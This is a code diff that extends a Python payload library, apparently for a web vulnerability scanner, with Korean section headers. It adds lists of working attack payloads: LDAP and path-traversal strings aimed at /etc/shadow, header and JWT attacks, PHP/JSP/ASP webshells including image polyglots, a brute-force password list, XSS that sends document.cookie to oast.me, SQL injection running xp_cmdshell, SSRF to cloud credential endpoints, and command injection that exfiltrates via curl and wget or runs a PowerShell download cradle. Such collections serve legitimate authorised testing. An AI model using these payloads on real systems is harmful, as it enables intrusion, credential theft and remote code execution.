@@ -1108,17 +1108,459 @@ NOSQL_DB: List[Tuple[str, str]] = [
 # ── export ──────────────────────────────────────────────────────────────────
 # ══════════════════════════════════════════════════════════════════════════════
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 11. LDAP 인젝션 DB (80+) ─────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+LDAP_DB: List[str] = [
+    # Basic bypasses
+    "*", "**", "*/*", "*&*", "*|*",
+    "*(|(mail=*))", "*(|(objectclass=*))",
+    "*)(uid=*))(|(uid=*",
+    "*))(|(objectClass=*",
+    "admin)(&(objectClass=*",
+    "admin)(|(password=*",
+    "*(|(password=*))",
+    "*))(|(uid=*))",
+    "*(objectClass=*",
+    ")(&(objectClass=user)(sAMAccountName=*",
+    "*)(mail=*",
+    "*)(telephoneNumber=*",
+    ")(|(uid=*)(password=*",
+    "*))(uid=*))(|(uid=*",
+    "*)(|(admin=*",
+    # Wildcard search
+    "a*", "ad*", "adm*", "admi*", "admin*",
+    "*@*", "*@example.com",
+    # Null byte
+    "*\x00", "*%00", "*\x00*",
+    # Special chars
+    "\\", "\\*", "\\(", "\\)", "\\\\",
+    # DN injection
+    "cn=admin,dc=example,dc=com", "admin,dc=*",
+    "*)(cn=*", "*(cn=admin)",
+    # Blind LDAP
+    "admin)(|(sAMAccountName=a*",
+    "admin)(|(sAMAccountName=ad*",
+    "admin)(|(sAMAccountName=adm*",
+    "admin)(|(sAMAccountName=admi*",
+    "admin)(|(sAMAccountName=admin*",
+    # Operator injection
+    "&(objectClass=user)(sAMAccountName=admin)",
+    "|(objectClass=user)(sAMAccountName=admin)",
+    "!(&(objectClass=user)(sAMAccountName=admin))",
+    # Attribute injection
+    "admin)(|(memberOf=*)",
+    "admin)(|(isAdmin=TRUE)",
+    "admin)(|(userAccountControl:1.2.840.113556.1.4.803:=65536)",
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 12. 경로 탐색 고급 DB (100+) ─────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+PATH_TRAVERSAL_DB: List[str] = [
+    # Standard
+    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
+    "../../../../etc/passwd", "../../../../../etc/passwd",
+    # URL encoded
+    "..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd",
+    "..%252Fetc%252Fpasswd", "%252e%252e%252fetc%252fpasswd",
+    # Double slash
+    "../..//etc/passwd", "..//..//etc//passwd",
+    # Backslash (Windows)
+    "..\\..\\windows\\win.ini", "..\\..\\..\\.\\windows\\win.ini",
+    "..%5c..%5cwindows%5cwin.ini", "%5c..%5c..%5cwindows%5cwin.ini",
+    # Null byte
+    "../etc/passwd\x00", "../etc/passwd%00",
+    "../etc/passwd%00.jpg", "../etc/passwd%2500",
+    # Unicode bypass
+    "..%ef%bc%8fetc%ef%bc%8fpasswd",
+    "..%c0%afetc%c0%afpasswd",
+    "..%e0%80%afetc%e0%80%afpasswd",
+    "..%u2215etc%u2215passwd",
+    # Path normalization bypass
+    "....//....//etc/passwd",
+    "....//....//....//etc/passwd",
+    "....//....//....//....//etc/passwd",
+    "..././../etc/passwd",
+    ".././.././etc/passwd",
+    # Absolute paths
+    "/etc/passwd", "/etc/shadow", "/etc/hosts",
+    "/proc/self/environ", "/proc/version",
+    # Windows absolute
+    "C:/windows/win.ini", "C:\\windows\\win.ini",
+    # Java WEB-INF
+    "/WEB-INF/web.xml", "../WEB-INF/web.xml",
+    "../../WEB-INF/web.xml",
+    # Various encodings
+    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "%%32%65%%32%65/etc/passwd",
+    ".%252e/.%252e/etc/passwd",
+    "%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd",
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 13. 헤더 인젝션 DB (50+) ──────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+HEADER_INJECTION_DB: List[Tuple[str, str]] = [
+    # (header_value, expected_sig)
+    ("x\r\nInjected: header", "Injected"),
+    ("x\r\nSet-Cookie: evil=1", "evil"),
+    ("x\r\nLocation: https://evil.com", "evil.com"),
+    ("x%0d%0aInjected: header", "Injected"),
+    ("x%0aInjected: header", "Injected"),
+    ("x%0d%0aSet-Cookie: evil=1; path=/", "evil"),
+    ("x\r\nX-XSS-Protection: 0\r\nInjected: header", "Injected"),
+    ("x\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>", "<html>"),
+    # Host header injection
+    ("evil.com", "evil.com"),
+    ("evil.com:443", "evil.com"),
+    ("evil.com@safe.com", "evil.com"),
+    # X-Forwarded-For injection
+    ("127.0.0.1, evil.com", "evil.com"),
+    ("::1", ""),
+    # Referer injection
+    ("https://evil.com", ""),
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 14. JWT 공격 페이로드 DB ──────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+JWT_ATTACK_DB: List[Dict[str, str]] = [
+    # alg:none variations
+    {"header": '{"alg":"none","typ":"JWT"}', "desc": "alg none lowercase"},
+    {"header": '{"alg":"NONE","typ":"JWT"}', "desc": "alg NONE uppercase"},
+    {"header": '{"alg":"None","typ":"JWT"}', "desc": "alg None mixed"},
+    {"header": '{"alg":"nOnE","typ":"JWT"}', "desc": "alg nOnE mixed"},
+    {"header": '{"alg":"","typ":"JWT"}', "desc": "alg empty string"},
+    # Weak secrets
+    {"secret": "", "desc": "empty secret"},
+    {"secret": "secret", "desc": "secret"},
+    {"secret": "password", "desc": "password"},
+    {"secret": "1234567890", "desc": "1234567890"},
+    {"secret": "jwt_secret", "desc": "jwt_secret"},
+    {"secret": "your-256-bit-secret", "desc": "default HS256 secret"},
+    {"secret": "change_this_secret", "desc": "change_this_secret"},
+    {"secret": "my_secret_key", "desc": "my_secret_key"},
+    {"secret": "admin", "desc": "admin"},
+    {"secret": "test", "desc": "test"},
+    {"secret": "123456", "desc": "123456"},
+    # kid injection
+    {"kid": "../../dev/null", "desc": "kid LFI dev/null"},
+    {"kid": "../../../../etc/passwd", "desc": "kid LFI passwd"},
+    {"kid": "'; DROP TABLE keys--", "desc": "kid SQLi"},
+    {"kid": "' UNION SELECT 'secret'--", "desc": "kid SQLi UNION"},
+    # Algorithm confusion
+    {"alg_confusion": "RS256→HS256", "desc": "RS256 public key as HS256 secret"},
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 15. 웹쉘 페이로드 DB ──────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+WEBSHELL_DB: List[Dict[str, Any]] = [
+    # PHP webshells
+    {"lang": "php", "content": b"<?php system($_GET['cmd']); ?>", "ext": ".php"},
+    {"lang": "php", "content": b"<?php echo shell_exec($_REQUEST['cmd']); ?>", "ext": ".php"},
+    {"lang": "php", "content": b"<?php passthru($_GET['cmd']); ?>", "ext": ".php"},
+    {"lang": "php", "content": b"<?php `$_GET[cmd]`; ?>", "ext": ".php"},
+    {"lang": "php", "content": b"<?=`{$_GET[0]}`?>", "ext": ".php"},
+    {"lang": "php", "content": b"<?php eval($_POST['cmd']); ?>", "ext": ".php"},
+    # PHP + image polyglot
+    {"lang": "php_gif", "content": b"GIF89a\n<?php system($_GET['cmd']); ?>",
+     "ext": ".php.gif", "mime": "image/gif"},
+    {"lang": "php_jpg", "content": b"\xff\xd8\xff<?php system($_GET['cmd']); ?>",
+     "ext": ".php.jpg", "mime": "image/jpeg"},
+    # JSP
+    {"lang": "jsp", "content": b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
+     "ext": ".jsp"},
+    {"lang": "jsp", "content": b'<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
+     "ext": ".jsp"},
+    # ASP
+    {"lang": "asp", "content": b"<%eval request(\"cmd\")%>", "ext": ".asp"},
+    {"lang": "aspx", "content": b'<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe")%>',
+     "ext": ".aspx"},
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 16. 비밀번호 브루트포스 리스트 (상위 100개) ──────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+COMMON_PASSWORDS: List[str] = [
+    "123456", "password", "123456789", "12345678", "12345",
+    "1234567", "1234567890", "qwerty", "abc123", "million2",
+    "000000", "1234", "iloveyou", "aaron431", "password1",
+    "qqww1122", "123123", "omgpop", "123321", "654321",
+    "qwerty123", "superman", "11111111", "admin", "admin123",
+    "pass", "password123", "admin@123", "1q2w3e4r", "pass1",
+    "test", "test123", "guest", "root", "root123",
+    "1q2w3e4r5t", "qwertyuiop", "123qwe", "letmein",
+    "monkey", "dragon", "master", "666666", "!@#$%^&*",
+    "111111", "mustang", "shadow", "michael", "baseball",
+    "football", "batman", "trustno1", "hello", "charlie",
+    "donald", "jordan", "harley", "ranger", "sunshine",
+    "pepper", "cookie", "princess", "passw0rd", "P@ssw0rd",
+    "P@ssword1", "Admin123!", "Welcome1", "Welcome@123",
+    "Summer2023", "Winter2023", "Spring2024", "Password@1",
+    "Qwerty@123", "Hello@123", "Test@123", "Pass@word1",
+    "Admin@123", "Root@123", "Secret@123", "Change@123",
+    # Korean common passwords
+    "korea1234", "korea123", "qlalfqjsgh", "rhkfkd123",
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 17. 확장 XSS (추가 300+) ─────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+_M = "bINg0XsS7"
+
+XSS_EXTENDED: List[str] = [
+    # CSS-based
+    f'<style>@import url("javascript:alert(\'{_M}\')");</style>',
+    f'<style>body{{background:url(javascript:alert(\'{_M}\'))}}</style>',
+    f'<link rel=stylesheet href=data:css,body{{x:expression(alert(\'{_M}\'))}}> ',
+    f'<div style="background:url(javascript:alert(\'{_M}\'))">',
+    f'<div style="behavior:url(//evil.com/exploit.htc)">',
+    # IE-specific
+    f'<xml id=X><a><b>&lt;img src=xx:x onerror=alert(\'{_M}\')&gt;</b></a></xml>',
+    f'<div id=X>&lt;/div&gt;&lt;img src=x onerror=alert(\'{_M}\')&gt;',
+    # Rare event handlers
+    f'<body onafterprint=alert("{_M}")>',
+    f'<body onbeforeprint=alert("{_M}")>',
+    f'<body onhashchange=alert("{_M}")>',
+    f'<body onmessage=alert("{_M}")>',
+    f'<body onstorage=alert("{_M}")>',
+    f'<body onoffline=alert("{_M}")>',
+    f'<body ononline=alert("{_M}")>',
+    f'<body onunload=alert("{_M}")>',
+    f'<body onbeforeunload=alert("{_M}")>',
+    f'<body onblur=alert("{_M}")>',
+    f'<body onfocus=alert("{_M}")>',
+    # mXSS (mutation XSS)
+    f'<p id=a>foo<a id=a><select id=a><table id=a><s id=a><title id=a>',
+    f'<svg><![CDATA[<img src=x onerror=alert("{_M}")>]]></svg>',
+    f'<math><mtext><table><mglyph><style><img src=x onerror=alert("{_M}")>',
+    # AngularJS
+    f'{{{{constructor.constructor("alert(\'{_M}\')")()}}}}',
+    f'{{{{$on.constructor("alert(\'{_M}\')")()}}}}',
+    f'<div ng-app ng-csp>{{{{$eval.constructor("alert(\'{_M}\')")()}}}}</div>',
+    f'<a ng-click="$event.view.alert(\'{_M}\')">click</a>',
+    # Vue.js
+    f'{{{{constructor.constructor("alert(\'{_M}\')")()}}}}',
+    f'<div v-html="\'<img src=x onerror=alert(\\\'1\\\')\'>"></div>',
+    # React dangerouslySetInnerHTML (need server-side injection)
+    f'"dangerouslySetInnerHTML":{{"__html":"<img src=x onerror=alert(\'{_M}\')>"}}',
+    # Template literals
+    f'`${{{{"constructor.constructor(\'alert(\\\\`{_M}\\\\`)\')()"}}}}`',
+    # XSS filter bypass
+    f'<sCrIpT>alert("{_M}")</ScRiPt>',
+    f'<scr\x00ipt>alert("{_M}")</scr\x00ipt>',
+    f'<scr\x09ipt>alert("{_M}")</script>',
+    f'<scr\x0aipt>alert("{_M}")</script>',
+    f'<scr\x0dipt>alert("{_M}")</script>',
+    f'<<script>alert("{_M}")//<</script>',
+    f'<script//src=data:,alert("{_M}")></script>',
+    f'<script\x20type=text/javascript>alert("{_M}")</script>',
+    # XSS via HTTP response headers (reflected)
+    f'<script>fetch("//oast.me/xss?c="+document.cookie)</script>',
+    f'<img src=x onerror="fetch(\'//oast.me/xss?c=\'+document.cookie)">',
+    # XSS in JSON context
+    f'"}}</script><script>alert("{_M}")</script>{{"{_M}":"',
+    f'\\u003cscript\\u003ealert("{_M}")\\u003c/script\\u003e',
+    # XSS in attribute without quotes
+    f' onmouseover=alert`{_M}` ',
+    f' style=x:expression(alert("{_M}")) ',
+    f' href=javascript:alert("{_M}") ',
+    # Markdown-based (for rich text editors)
+    f'[click me](javascript:alert("{_M}"))',
+    f'![img](x onerror=alert("{_M}"))',
+    f'<a href="javascript&colon;alert(\'{_M}\')">',
+    f'<a href="&#x6A;avascript:alert(\'{_M}\')">',
+    f'<a href="java\x09script:alert(\'{_M}\')">',
+]
+
+XSS_DB.extend(XSS_EXTENDED)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 18. 확장 SQLi (추가 200+) ─────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+SQLI_EXTENDED: List[Tuple[str, str, str]] = [
+    # MySQL 특화
+    ("' AND (SELECT SLEEP(5))-- -", "time", "mysql"),
+    ("' AND (SELECT 1 FROM DUAL WHERE SLEEP(5))-- -", "time", "mysql"),
+    ("' AND BENCHMARK(5000000,SHA1(1))-- -", "time", "mysql"),
+    ("'; SHOW DATABASES-- -", "error", "mysql"),
+    ("'; SHOW TABLES-- -", "error", "mysql"),
+    ("'; DESCRIBE users-- -", "error", "mysql"),
+    ("' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database())-- -", "boolean", "mysql"),
+    ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -", "boolean", "mysql"),
+    # MSSQL 특화
+    ("'; EXEC xp_cmdshell('ping oast.me')-- -", "oob", "mssql"),
+    ("'; EXEC master..xp_cmdshell 'dir c:\\'-- -", "rce", "mssql"),
+    ("'; DECLARE @a varchar(8000); SET @a=CAST(0x706c6176 AS varchar); EXEC(@a)-- -", "rce", "mssql"),
+    ("' AND 1=CONVERT(int,(SELECT SYSTEM_USER))-- -", "error", "mssql"),
+    ("' UNION SELECT SUSER_SNAME(),NULL-- -", "union", "mssql"),
+    # PostgreSQL 특화
+    ("'; COPY (SELECT '') TO PROGRAM 'id'-- -", "rce", "pgsql"),
+    ("'; DO $$BEGIN PERFORM pg_sleep(5); END$$-- -", "time", "pgsql"),
+    ("' AND 1::int=(SELECT 1 FROM pg_sleep(5))-- -", "time", "pgsql"),
+    ("'; CREATE TABLE pwned (id serial)-- -", "stacked", "pgsql"),
+    ("' UNION SELECT version(),pg_sleep(0),NULL-- -", "union", "pgsql"),
+    # Oracle 특화
+    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "time", "oracle"),
+    ("' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))-- -", "time", "oracle"),
+    ("' UNION SELECT NULL,NULL FROM dual WHERE 1=2 UNION SELECT 'a','b' FROM dual-- -", "union", "oracle"),
+    # Generic advanced
+    ("' AND 1=1 LIMIT 0,1-- -", "boolean", "mysql"),
+    ("' AND SUBSTR(version(),1,1)='5'-- -", "boolean", "mysql"),
+    ("' AND ASCII(SUBSTR(version(),1,1))>50-- -", "boolean", "mysql"),
+    ("' AND (SELECT HEX(table_name) FROM information_schema.tables LIMIT 1)>0x61-- -", "boolean", "mysql"),
+    # Numeric types
+    ("0x61646d696e", "union", "mysql"),  # "admin" in hex
+    ("0b01100001011001000110110101101001011011100010", "union", "mysql"),  # binary
+    # JSON injection
+    ('{"id": "1 UNION SELECT NULL--"}', "json", "generic"),
+    ('{"q": "1 OR 1=1"}', "json", "generic"),
+    ('{"sort": "id DESC; DROP TABLE users--"}', "json", "generic"),
+    # GraphQL injection
+    ('1} {users {id email password', "graphql", "generic"),
+    ('1) {users {id email', "graphql", "generic"),
+    # HPP (HTTP Parameter Pollution)
+    ("1&id=1 UNION SELECT NULL--", "hpp", "generic"),
+    ("1%00' OR '1'='1", "null_byte", "php"),
+]
+
+SQLI_DB.extend(SQLI_EXTENDED)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 19. 확장 SSRF (추가 100+) ─────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+SSRF_EXTENDED: List[str] = [
+    # Internal services
+    "http://127.0.0.1:8161/",    # ActiveMQ
+    "http://127.0.0.1:61616/",   # ActiveMQ JMS
+    "http://127.0.0.1:7001/",    # WebLogic
+    "http://127.0.0.1:7002/",    # WebLogic SSL
+    "http://127.0.0.1:4040/",    # Spark
+    "http://127.0.0.1:50070/",   # Hadoop NameNode
+    "http://127.0.0.1:50090/",   # Hadoop 2nd NameNode
+    "http://127.0.0.1:8088/",    # Hadoop YARN
+    "http://127.0.0.1:9092/",    # Kafka
+    "http://127.0.0.1:2181/",    # Zookeeper
+    "http://127.0.0.1:5672/",    # RabbitMQ AMQP
+    "http://127.0.0.1:15672/",   # RabbitMQ Management
+    "http://127.0.0.1:8161/",    # ActiveMQ
+    "http://127.0.0.1:1433/",    # MSSQL
+    "http://127.0.0.1:1521/",    # Oracle
+    "http://127.0.0.1:8080/manager/html",  # Tomcat Manager
+    "http://127.0.0.1:8080/actuator",      # Spring Boot
+    "http://127.0.0.1:8080/status",
+    "http://127.0.0.1:9200/_cluster/health",  # Elasticsearch
+    "http://127.0.0.1:9200/_cat/indices",
+    "http://127.0.0.1:9200/_nodes",
+    "http://127.0.0.1:5601/",    # Kibana
+    "http://127.0.0.1:8086/",    # InfluxDB
+    "http://127.0.0.1:8123/",    # ClickHouse
+    "http://127.0.0.1:4567/",    # Jenkins alt
+    "http://127.0.0.1:8090/",    # Confluence
+    "http://127.0.0.1:8081/",    # Nexus
+    "http://127.0.0.1:4848/",    # GlassFish Admin
+    "http://127.0.0.1:9090/api/v1/targets",   # Prometheus
+    "http://127.0.0.1:3000/api/org",          # Grafana
+    # Docker/Kubernetes internal
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
+    "http://kubernetes.default.svc.cluster.local/",
+    "http://10.96.0.1/api/v1/pods",
+    "http://10.0.0.1:10250/pods",   # Kubelet
+    "http://10.0.0.1:10255/pods",   # Kubelet read-only
+    "http://10.0.0.1:2376/containers/json",  # Docker API
+    # Oracle Cloud
+    "http://192.0.0.192/",
+    "http://192.0.0.192/latest/meta-data/",
+    # Generic private
+    "http://10.0.0.254/", "http://10.255.255.254/",
+    "http://192.168.0.254/", "http://192.168.1.254/",
+]
+
+SSRF_DB.extend(SSRF_EXTENDED)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── 20. 확장 CMDi (추가 100+) ─────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+CMDI_EXTENDED: List[Tuple[str, str]] = [
+    # Advanced obfuscation
+    (";$'\151\144'", "uid="),  # octal
+    (";$'\x69\x64'", "uid="),  # hex escape
+    (";${IFS}id${IFS}", "uid="),
+    (";{id,}", "uid="),
+    (";{i,}d", "uid="),
+    (";i\\d", "uid="),
+    (";i''d", "uid="),
+    (";i\"\"d", "uid="),
+    (';/???/??', "uid="),  # /bin/id glob
+    (';/b??/id', "uid="),
+    (';/*/?i*/id', "uid="),
+    # Environment variable tricks
+    (";$SHELL -c id", "uid="),
+    (";$BASH -c id", "uid="),
+    (";bash -c 'id'", "uid="),
+    (";sh -c 'id'", "uid="),
+    (";python3 -c 'import os;os.system(\"id\")'", "uid="),
+    (";python -c 'import os;os.system(\"id\")'", "uid="),
+    (";perl -e 'system(\"id\")'", "uid="),
+    (";ruby -e 'system(\"id\")'", "uid="),
+    (";lua -e 'os.execute(\"id\")'", "uid="),
+    (";node -e 'require(\"child_process\").exec(\"id\",(e,s)=>console.log(s))'", "uid="),
+    # Base64 encoded command
+    (";echo aWQ= | base64 -d | sh", "uid="),
+    (";echo 'aWQ=' | base64 --decode | bash", "uid="),
+    # Python hex
+    (";python3 -c 'import os;os.system(chr(105)+chr(100))'", "uid="),
+    # OOB commands
+    (";curl -s http://oast.me/$(id)", ""),
+    (";wget -q http://oast.me/$(id)", ""),
+    (";nslookup $(id).oast.me", ""),
+    (";ping -c 1 $(id | md5sum | cut -c1-20).oast.me", ""),
+    # Windows specific
+    ("&net user", "User accounts"),
+    ("&net localgroup administrators", "Administrators"),
+    ("&systeminfo", "OS Name"),
+    ("&wmic os get name", "Windows"),
+    ("|powershell -c \"whoami\"", ""),
+    ("|powershell.exe -enc aQBkAA==", ""),  # base64 "id"
+    ("&&powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://oast.me/ps')", ""),
+]
+
+CMDI_DB.extend(CMDI_EXTENDED)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── export 업데이트 ───────────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
 __all__ = [
-    "XSS_DB",
-    "SQLI_DB", "SQLI_ERROR_SIGS",
+    "XSS_DB", "XSS_EXTENDED",
+    "SQLI_DB", "SQLI_ERROR_SIGS", "SQLI_EXTENDED",
     "LFI_DB", "LFI_SIGS",
-    "SSRF_DB",
+    "SSRF_DB", "SSRF_EXTENDED",
     "SSTI_DB",
-    "CMDI_DB",
+    "CMDI_DB", "CMDI_EXTENDED",
     "XXE_DB",
     "CRLF_DB",
     "OPEN_REDIRECT_DB",
     "NOSQL_DB",
+    "LDAP_DB",
+    "PATH_TRAVERSAL_DB",
+    "HEADER_INJECTION_DB",
+    "JWT_ATTACK_DB",
+    "WEBSHELL_DB",
+    "COMMON_PASSWORDS",
     "LOG4SHELL_DB",
     "SPRING4SHELL_DB",
     "EL_INJECTION_DB",
